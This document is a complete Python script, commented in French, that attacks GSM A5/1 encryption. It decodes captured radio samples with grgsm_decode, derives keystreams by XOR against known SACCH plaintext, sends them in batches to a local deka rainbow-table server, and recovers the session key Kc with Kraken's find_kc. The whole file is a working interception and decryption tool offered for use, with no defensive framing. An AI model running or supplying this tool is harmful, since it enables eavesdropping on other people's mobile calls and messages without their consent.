#!/usr/bin/env python3
# crack_all.py — attaque A5/1 depuis un .cfile, SANS plomber deka.
#
#   .cfile --(grgsm_decode -p, sans cle)--> bursts chiffres
#          --XOR plaintext connu--> keystreams --deka--> etats --find_kc--> Kc
#
# DEKA-FRIENDLY : soumission par petits LOTS, chaque lot est VIDE (tous les 'took'
# recus) avant le suivant, et au Ctrl-C on draine le lot en cours -> AUCUN job orphelin
# laisse dans paplon (c'est ce qui clogguait deka et t'obligeait a redemarrer).
#
# Usage : python3 crack_all.py <cfile|bursts> [--mode TCHF --ts 2 --arfcn 514 --samp 1083333]
#         [--start FN --step 104 --maxblocks 24 --plain si5_sacch,si6_sacch --batch 8 --secs 320]

import sys, os, socket, select, time, subprocess, tempfile, signal
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
_HERE=os.path.dirname(os.path.abspath(__file__))
from ciphereds import load, block
from plaintexts import plaintext_bursts

FINDKC='/mnt/kraken/Utilities/find_kc'
HOST,PORT=('127.0.0.1',6666)
def xor(a,b): return ''.join('1' if a[i]!=b[i] else '0' for i in range(114))
def opt(n,d): return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d

STOP=False
def _sig(*_):
    global STOP; STOP=True
    print("\n[Ctrl-C] on draine le lot en cours puis on sort (pas d'orphelins)...",flush=True)
signal.signal(signal.SIGINT,_sig)

def extract_bursts(cfile,mode,ts,arfcn,samp,secs):
    out=tempfile.mktemp(suffix='.bursts',dir=_HERE); sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),'-c',cfile,'-p','-o',sp]
    print("extraction:",' '.join(cmd),flush=True)
    with open(out,'w') as f:
        try: subprocess.run(cmd,stdout=f,stderr=subprocess.DEVNULL,timeout=int(secs))
        except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    return out

def drain_batch(sock, my_ks):
    """Soumet un lot, attend TOUS les 'took' de CE lot, retourne les Found (etat,bitpos,count)."""
    myset=set(my_ks.values())            # keystreams de ce lot
    jobmap={}; founds=[]; buf=b''; nready=0
    for ks in my_ks.values():
        sock.sendall(("crack %s\n"%ks).encode()); time.sleep(0.02)
    ntook=0; sock.setblocking(False)
    while ntook < len(my_ks):
        r,_,_=select.select([sock],[],[],3.0)
        if not r: continue
        d=sock.recv(32768)
        if not d: raise ConnectionError("deka a ferme")
        buf+=d
        while b'\n' in buf:
            line,buf=buf.split(b'\n',1); t=line.decode('ascii','ignore').rstrip(); p=t.split()
            if t.startswith('Cracking') and len(p)>=3 and p[2] in myset:
                jobmap[p[1].lstrip('#')]=p[2]
            elif t.startswith('Found') and len(p)>=5:
                ks=jobmap.get(p[4].lstrip('#'))
                if ks: founds.append((p[1],p[3],ks))
            elif 'took' in t and len(p)>=3 and p[2].lstrip('#') in jobmap:
                ntook+=1
    sock.setblocking(True)
    return founds

def main():
    if len(sys.argv)<2: sys.exit(__doc__)
    src=sys.argv[1]
    names=opt('--plain','si5_sacch,si6_sacch').split(',')
    batch=int(opt('--batch','8'))
    if src.endswith('.cfile'):
        bpath=extract_bursts(src,opt('--mode','TCHF'),opt('--ts','2'),opt('--arfcn','514'),opt('--samp','1083333'),opt('--secs','320'))
    else: bpath=src
    bursts=load(bpath); fns=sorted(bursts)
    if not fns: sys.exit("aucun burst")
    print("bursts:",len(bursts),"FN",fns[0],"->",fns[-1],flush=True)
    step=int(opt('--step','104')); start=int(opt('--start',str(fns[0]))); maxb=int(opt('--maxblocks','24'))
    Pc={n:plaintext_bursts(n) for n in names}
    ks_by_count={}; nb=0; fn=start
    while fn<=fns[-1] and nb<maxb:
        blk=block(bursts,fn)
        if blk:
            nb+=1
            for n in names:
                for i in range(4):
                    c,cb=blk[i]; ks_by_count.setdefault(xor(cb,Pc[n][i]),c)
        fn+=step
    jobs=[(k,c) for k,c in ks_by_count.items()]   # (keystream,count)
    print("blocs=%d  keystreams=%d  lots de %d"%(nb,len(jobs),batch),flush=True)

    allks=[(c,k) for k,c in jobs]     # (count,keystream) pour find_kc
    def try_findkc(state,bitpos,cnt):
        dec=str(int(state,16))+'x'
        for c2,k2 in allks:
            if c2==cnt: continue
            out=subprocess.run([FINDKC,dec,str(bitpos),str(cnt),str(c2),k2],capture_output=True,text=True).stdout
            if 'MATCHED' in out:
                for ln in out.splitlines():
                    if 'MATCHED' in ln:
                        print("\n*** KC TROUVE ***  état=%s count=%s verif=%s"%(state,cnt,c2)); print("   ",ln.strip())
                return True
        return False

    sock=socket.socket(); sock.connect((HOST,PORT))
    try:
        for i in range(0,len(jobs),batch):
            if STOP: break
            lot={c:k for k,c in jobs[i:i+batch]}   # count->keystream
            print("lot %d..%d"%(i,min(i+batch,len(jobs))),flush=True)
            founds=drain_batch(sock,lot)
            for state,bitpos,ks in founds:
                cnt=ks_by_count[ks]
                print("  Found %s @ %s count %s"%(state,bitpos,cnt),flush=True)
                if try_findkc(state,bitpos,cnt): return
        print("fini, aucun MATCHED (crack plus de blocs ou meilleur plaintext).")
    finally:
        sock.close()   # lot toujours draine -> aucun job orphelin
        print("connexion fermee proprement.",flush=True)

if __name__=='__main__': main()
